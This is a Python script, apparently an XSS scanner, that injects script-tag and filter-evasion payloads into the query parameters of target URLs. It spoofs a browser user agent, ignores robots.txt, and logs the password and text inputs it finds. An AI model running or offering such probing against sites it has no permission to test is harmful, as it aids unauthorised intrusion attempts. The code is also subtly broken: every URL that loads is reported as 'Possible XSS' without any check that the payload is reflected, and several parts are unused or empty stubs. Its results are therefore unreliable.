import os
import re
import sys
import urllib.parse as urlparse
import urllib.request as urllib2
import mechanize

payloads = ['<svg "ons>', '" onfocus="alert(1);', 'javascript:alert(1)']
blacklist = ['.png', '.jpg', '.jpeg', '.mp3', '.mp4', '.avi', '.gif', '.svg',
             '.pdf', '.css', '.js']
xssLinks = []            # TOTAL CROSS SITE SCRIPTING FINDINGS
ResDir = "results"
op = mechanize.Browser()
op.set_handle_equiv(True)
op.set_handle_gzip(True)
op.set_handle_redirect(True)
op.set_handle_referer(True)
op.set_handle_robots(False)
op.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def FindText(htmldata, FileName):
    if not os.path.isdir(ResDir):
        os.makedirs(ResDir, 0o755)
    
    pat = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
    if pat.match(FileName):
        FileName = "IP"
    
    try:
        f = open(os.path.join(ResDir, f"{FileName}.txt"), "a+")
        for tag in htmldata.findAll('input'):
            if tag.get('type') in ["text", "password"]:
                f.write(f"Found input tag: {tag}\n")
        f.close()
    except Exception as e:
        print(e)

def TestPayload(payload, p, link):
    try:
        if "=" in link:
            parts = link.split("=")
            parts[-1] = payload
            newlink = "=".join(parts)
            try:
                urllib2.urlopen(newlink).read()
                f = open(os.path.join(ResDir, "xss.txt"), "a+")
                f.write(f"Possible XSS: {newlink}\n")
                f.close()
            except Exception as e:
                print(e)
    except Exception as e:
        print(e)

def FindXSS(link):
    try:
        if not os.path.isdir(ResDir):
            os.makedirs(ResDir, 0o755)
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
            '"><script>alert("XSS")</script>',
            '"><script>alert(String.fromCharCode(88,83,83))</script>'
        ]
        
        for p in payloads:
            TestPayload(p, p, link)
    except Exception as e:
        print(e)

def RequestHandler(req, reqbody, threadid):
    return reqbody, threadid

def ResponseHandler(req, reqbody, res, resbody, threadid, threadid2):
    return resbody